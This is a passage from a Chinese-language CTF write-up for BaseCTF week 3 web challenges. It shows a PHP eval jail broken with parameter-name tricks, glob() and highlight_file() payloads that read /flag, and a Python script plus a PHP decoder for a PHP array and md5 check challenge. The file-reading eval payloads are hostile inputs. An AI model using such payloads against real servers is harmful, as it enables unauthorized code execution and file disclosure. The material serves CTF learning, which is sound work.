class="keyword">eval</span>(<span class="variable">$Jail</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Yes! you escaped from the jail! LOL!"</span>;</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"You will Jail in your life!"</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在HTML解析后再输出PHP源代码</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>



<p>关键代码分析</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Jail</span> = <span class="variable">$_GET</span>[<span class="string">'Jail_by.Happy'</span>];</span><br></pre></td></tr></tbody></table></figure>

<p>当 php 版本⼩于 8 时，GET 请求的参数名含有 . ，会被转为 _ ，但是如果参数名中有 [ ，这</p>
<p>个 [ 会被直接转为 _ ，但是后⾯如果有 . ，这个 . 就不会被转为 _ 。所以要完成这个传参，必须把参数名构造成这样</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?Jail[by.Happy=xxxxxx```</span><br></pre></td></tr></tbody></table></figure>

<p>页面前端中包含一个phpinfo页面，提示禁用很多命令执行的函数，所以在这里不考虑命令执行</p>
<p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/09/11/BaseCTF-week3/image-20240908193351917-172603271356812.png" alt="image-20240908193351917"></p>
<p>可用print_r(glob(‘/*’))以数组形式返回根目录的文件</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url?Jail[by.Happy=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">glob</span>(<span class="string">'/*'</span>));</span><br><span class="line"><span class="comment">//glob()用于查找文件，回返回一个文件数组;</span></span><br><span class="line"><span class="comment">//'/*'代表根目录下的所有文件和文件夹;</span></span><br><span class="line"><span class="comment">//用print_r()来输出改数组，</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/09/11/BaseCTF-week3/image-20240908194258997-172603271356813.png" alt="image-20240908194258997"></p>
<p>输出所有根目录下以fl开头的文件或文件夹</p>
<figure class="highlight stata"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?Jail[<span class="keyword">by</span>.Happy=print_r(<span class="keyword">glob</span>('/<span class="keyword">fl</span>*'));</span><br></pre></td></tr></tbody></table></figure>

<p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/09/11/BaseCTF-week3/image-20240908194814407-172603271356814.png" alt="image-20240908194814407"></p>
<p>我们可以利用highlight_file()函数来读取文件源码</p>
<p>payload</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url?Jail[by.Happy=highlight_file(glob(<span class="string">'/f*'</span>)[0]);</span><br><span class="line">//glob(<span class="string">'/f*'</span>)[0]指匹配到的文件数组的第一个值，即/flag</span><br></pre></td></tr></tbody></table></figure>

<p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/09/11/BaseCTF-week3/image-20240908195057756-172603271356815.png" alt="image-20240908195057756"></p>
<h3 id="玩原神玩的"><a href="#玩原神玩的" class="headerlink" title="玩原神玩的"></a>玩原神玩的</h3><p>这个题目可以学到很多东西，好好记录一下</p>
<p>题目源码</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">sizeof</span>(<span class="variable">$_POST</span>[<span class="string">'len'</span>]) == <span class="title function_ invoke__">sizeof</span>(<span class="variable">$array</span>)) {</span><br><span class="line">  <span class="title function_ invoke__">ys_open</span>(<span class="variable">$_GET</span>[<span class="string">'tip'</span>]);</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"错了！就你还想玩原神？❌❌❌"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ys_open</span>(<span class="params"><span class="variable">$tip</span></span>) </span>{</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$tip</span> != <span class="string">"我要玩原神"</span>) {</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"我不管，我要玩原神！😭😭😭"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="title function_ invoke__">dumpFlag</span>();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dumpFlag</span>(<span class="params"></span>) </span>{</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'m'</span>]) || <span class="title function_ invoke__">sizeof</span>(<span class="variable">$_POST</span>[<span class="string">'m'</span>]) != <span class="number">2</span>) {</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"可恶的QQ人！😡😡😡"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">'m'</span>][<span class="number">0</span>];</span><br><span class="line">  <span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">'m'</span>][<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$a</span>) || <span class="keyword">empty</span>(<span class="variable">$b</span>) || <span class="variable">$a</span> != <span class="string">"100%"</span> || <span class="variable">$b</span> != <span class="string">"love100%"</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)) {</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"某站崩了？肯定是某忽悠干的！😡😡😡"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">  <span class="variable">$flag</span>[] = <span class="keyword">array</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$ii</span> = <span class="number">0</span>;<span class="variable">$ii</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$array</span>);<span class="variable">$ii</span>++) {</span><br><span class="line">    <span class="variable">$flag</span>[<span class="variable">$ii</span>] = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$array</span>[<span class="variable">$ii</span>]) ^ <span class="variable">$ii</span>);</span><br><span class="line">  }</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$flag</span>);</span><br><span class="line">} 错了！就你还想玩原神？❌❌❌</span><br></pre></td></tr></tbody></table></figure>

<p>源码分析：</p>
<p>1、绕过“错了！就你还想玩原神？❌❌❌”</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">sizeof</span>(<span class="variable">$_POST</span>[<span class="string">'len'</span>]) == <span class="title function_ invoke__">sizeof</span>(<span class="variable">$array</span>)) {</span><br><span class="line">  <span class="title function_ invoke__">ys_open</span>(<span class="variable">$_GET</span>[<span class="string">'tip'</span>]);</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"错了！就你还想玩原神？❌❌❌"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>我们需要满足一个要求，一个是通过POST提交的len数组长度需要跟包含文件中flag.php的数组$array相同，可以通过python爆破实现</p>
<p>2、绕过“我不管，我要玩原神！😭😭😭”</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ys_open</span>(<span class="params"><span class="variable">$tip</span></span>) </span>{</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$tip</span> != <span class="string">"我要玩原神"</span>) {</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"我不管，我要玩原神！😭😭😭"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="title function_ invoke__">dumpFlag</span>();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>在上一个len数组满足要求后，会进入ys_open()，在这个函数里面我们需要对tip进行传参，并且传输的是中文字符串，我们也可以通过python实现</p>
<p>3、绕过“可恶的QQ人！😡😡😡”</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'m'</span>]) || <span class="title function_ invoke__">sizeof</span>(<span class="variable">$_POST</span>[<span class="string">'m'</span>]) != <span class="number">2</span>) {</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"可恶的QQ人！😡😡😡"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>进入dumpFlag()后，我们需要POST传参传入m数组，并且数组个数为两个</p>
<p>4、绕过”某站崩了？肯定是某忽悠干的！😡😡😡”</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">'m'</span>][<span class="number">0</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">'m'</span>][<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$a</span>) || <span class="keyword">empty</span>(<span class="variable">$b</span>) || <span class="variable">$a</span> != <span class="string">"100%"</span> || <span class="variable">$b</span> != <span class="string">"love100%"</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)) {</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"某站崩了？肯定是某忽悠干的！😡😡😡"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>要求传入的m数组第一个必须是”100%”，第二个必须是”love100%”拼接md5加密后的100%</p>
<p>给出相应的脚本提交数据</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://challenge.basectf.fun:22350/"</span></span><br><span class="line">post_data = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破$array数组长度</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45</span>):</span><br><span class="line">    post_data += <span class="string">f"len[]=<span class="subst">{i}</span>&amp;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 满足ys_open函数要求</span></span><br><span class="line">challenge_url = url + <span class="string">"?tip=我要玩原神"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#满足条件$a和$b</span></span><br><span class="line">post_data += <span class="string">"m[]=100%25&amp;m[]=love100%2530bd7ce7de206924302499f197c7a966"</span></span><br><span class="line"><span class="built_in">print</span>(post_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = requests.post(url=challenge_url,data=post_data,headers={<span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>})</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></tbody></table></figure>

<p>注意：</p>
<p>1)这里通过POST提交的数组必须在headers加上{‘Content-Type’: ‘application/x-www-form-urlencoded’}参数，这个参数告诉服务器提交的数据需要以表单数据格式来解析，确保数据中的len[]=1&amp;len[]=2等字符串能够被正确解析为php语言中的数组。</p>
<p>2)POST提交的100%中含有特殊字符%，必须对其进行url编码，这样才能保证服务器能正确识别%</p>
<p>5、还原flag</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="variable">$flag</span>[] = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$ii</span> = <span class="number">0</span>;<span class="variable">$ii</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$array</span>);<span class="variable">$ii</span>++) {</span><br><span class="line">  <span class="variable">$flag</span>[<span class="variable">$ii</span>] = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$array</span>[<span class="variable">$ii</span>]) ^ <span class="variable">$ii</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$flag</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>服务器将flag的每一个字符跟其对应的数组索引值进行异或运算，我们需要做的是将其还原成flag，主要思路就是通过枚举ascii字符与其索引值的异或运算结果，如果结果相同则可以确定flag字符对应的ascii值，然后将其还原成flag字符串，下面是服务器给出的json数据</p>
<figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span><span class="string">"3295c76acbf4caaed33c36b1b5fc2cb1"</span><span class="punctuation">,</span><span class="string">"26657d5ff9020d2abefe558796b99584"</span><span class="punctuation">,</span><span class="string">"73278a4a86960eeb576a8fd4c9ec6997"</span><span class="punctuation">,</span><span class="string">"ec8956637a99787bd197eacd77acce5e"</span><span class="punctuation">,</span><span class="string">"e2c420d928d4bf8ce0ff2ec19b371514"</span><span class="punctuation">,</span><span class="string">"43ec517d68b6edd3015b3edc9a11367b"</span><span class="punctuation">,</span><span class="string">"ea5d2f1c4608232e07d3aa3d998e5135"</span><span class="punctuation">,</span><span class="string">"c8ffe9a587b126f152ed3d89a146b445"</span><span class="punctuation">,</span><span class="string">"7f39f8317fbdb1988ef4c628eba02591"</span><span class="punctuation">,</span><span class="string">"642e92efb79421734881b53e1e1b18b6"</span><span class="punctuation">,</span><span class="string">"9f61408e3afb633e50cdf1b20de6f466"</span><span class="punctuation">,</span><span class="string">"9f61408e3afb633e50cdf1b20de6f466"</span><span class="punctuation">,</span><span class="string">"2723d092b63885e0d7c260cc007e8b9d"</span><span class="punctuation">,</span><span class="string">"72b32a1f754ba1c09b3695e0cb6cde7f"</span><span class="punctuation">,</span><span class="string">"03afdbd66e7929b125f8597834fa83a4"</span><span class="punctuation">,</span><span class="string">"b53b3a3d6ab90ce0268229151c9bde11"</span><span class="punctuation">,</span><span class="string">"7f39f8317fbdb1988ef4c628eba02591"</span><span class="punctuation">,</span><span class="string">"c45147dee729311ef5b5c3003946c48f"</span><span class="punctuation">,</span><span class="string">"2b44928ae11fb9384c4cf38708677c48"</span><span class="punctuation">,</span><span class="string">"a1d0c6e83f027327d8461063f4ac58a6"</span><span class="punctuation">,</span><span class="string">"7f6ffaa6bb0b408017b62254211691b5"</span><span class="punctuation">,</span><span class="string">"9f61408e3afb633e50cdf1b20de6f466"</span><span class="punctuation">,</span><span class="string">"e369853df766fa44e1ed0ff613f563bd"</span><span class="punctuation">,</span><span class="string">"73278a4a86960eeb576a8fd4c9ec6997"</span><span class="punctuation">,</span><span class="string">"6c8349cc7260ae62e3b1396831a8398f"</span><span class="punctuation">,</span><span class="string">"6c8349cc7260ae62e3b1396831a8398f"</span><span class="punctuation">,</span><span class="string">"b53b3a3d6ab90ce0268229151c9bde11"</span><span class="punctuation">,</span><span class="string">"1c383cd30b7c298ab50293adfecb7b18"</span><span class="punctuation">,</span><span class="string">"17e62166fc8586dfa4d1bc0e1742c08b"</span><span class="punctuation">,</span><span class="string">"19ca14e7ea6328a42e0eb13d585e4c22"</span><span class="punctuation">,</span><span class="string">"d67d8ab4f4c10bf22aa353e27879133c"</span><span class="punctuation">,</span><span class="string">"c0c7c76d30bd3dcaefc96f40275bdc0a"</span><span class="punctuation">,</span><span class="string">"14bfa6bb14875e45bba028a21ed38046"</span><span class="punctuation">,</span><span class="string">"ea5d2f1c4608232e07d3aa3d998e5135"</span><span class="punctuation">,</span><span class="string">"e2c420d928d4bf8ce0ff2ec19b371514"</span><span class="punctuation">,</span><span class="string">"ea5d2f1c4608232e07d3aa3d998e5135"</span><span class="punctuation">,</span><span class="string">"6f4922f45568161a8cdf4ad2299f6d23"</span><span class="punctuation">,</span><span class="string">"e2c420d928d4bf8ce0ff2ec19b371514"</span><span class="punctuation">,</span><span class="string">"c74d97b01eae257e44aa9d5bade97baf"</span><span class="punctuation">,</span><span class="string">"735b90b4568125ed6c3f678819b6e058"</span><span class="punctuation">,</span><span class="string">"6ea9ab1baa0efb9e19094440c317e21b"</span><span class="punctuation">,</span><span class="string">"ad61ab143223efbc24c7d2583be69251"</span><span class="punctuation">,</span><span class="string">"1f0e3dad99908345f7439f8ffabdffc4"</span><span class="punctuation">,</span><span class="string">"1f0e3dad99908345f7439f8ffabdffc4"</span><span class="punctuation">,</span><span class="string">"43ec517d68b6edd3015b3edc9a11367b"</span><span class="punctuation">]</span></span><br></pre></td></tr></tbody></table></figure>

<p>用python写脚本还原flag不知道为啥不行，这里用php写一个脚本</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将json数据整理成数组形式</span></span><br><span class="line"><span class="variable">$json_data</span> = [</span><br><span class="line">    <span class="string">"3295c76acbf4caaed33c36b1b5fc2cb1"</span>, <span class="string">"26657d5ff9020d2abefe558796b99584"</span>,</span><br><span class="line">    <span class="string">"73278a4a86960eeb576a8fd4c9ec6997"</span>, <span class="string">"ec8956637a99787bd197eacd77acce5e"</span>,</span><br><span class="line">    <span class="string">"e2c420d928d4bf8ce0ff2ec19b371514"</span>, <span class="string">"43ec517d68b6edd3015b3edc9a11367b"</span>,</span><br><span class="line">    <span class="string">"ea5d2f1c4608232e07d3aa3d998e5135"</span>, <span class="string">"c8ffe9a587b126f152ed3d89a146b445"</span>,</span><br><span class="line">    <span class="string">"f457c545a9ded88f18ecee47145a72c0"</span>, <span class="string">"03afdbd66e7929b125f8597834fa83a4"</span>,</span><br><span class="line">    <span class="string">"093f65e080a295f8076b1c5722a46aa2"</span>, <span class="string">"03afdbd66e7929b125f8597834fa83a4"</span>,</span><br><span class="line">    <span class="string">"698d51a19d8a121ce581499d7b701668"</span>, <span class="string">"d82c8d1619ad8176d665453cfb2e55f0"</span>,</span><br><span class="line">    <span class="string">"b53b3a3d6ab90ce0268229151c9bde11"</span>, <span class="string">"9f61408e3afb633e50cdf1b20de6f466"</span>,</span><br><span class="line">    <span class="string">"7f39f8317fbdb1988ef4c628eba02591"</span>, <span class="string">"07e1cd7dca89a1678042477183b7ac3f"</span>,</span><br><span class="line">    <span class="string">"a1d0c6e83f027327d8461063f4ac58a6"</span>, <span class="string">"7f6ffaa6bb0b408017b62254211691b5"</span>,</span><br><span class="line">    <span class="string">"d67d8ab4f4c10bf22aa353e27879133c"</span>, <span class="string">"9f61408e3afb633e50cdf1b20de6f466"</span>,</span><br><span class="line">    <span class="string">"e369853df766fa44e1ed0ff613f563bd"</span>, <span class="string">"5fd0b37cd7dbbb00f97ba6ce92bf5add"</span>,</span><br><span class="line">    <span class="string">"67c6a1e7ce56d3d6fa748ab6d9af3fd7"</span>, <span class="string">"3416a75f4cea9109507cacd8e2f2aefc"</span>,</span><br><span class="line">    <span class="string">"b53b3a3d6ab90ce0268229151c9bde11"</span>, <span class="string">"1c383cd30b7c298ab50293adfecb7b18"</span>,</span><br><span class="line">    <span class="string">"3416a75f4cea9109507cacd8e2f2aefc"</span>, <span class="string">"da4fb5c6e93e74d3df8527599fa62642"</span>,</span><br><span class="line">    <span class="string">"c8ffe9a587b126f152ed3d89a146b445"</span>, <span class="string">"c0c7c76d30bd3dcaefc96f40275bdc0a"</span>,</span><br><span class="line">    <span class="string">"735b90b4568125ed6c3f678819b6e058"</span>, <span 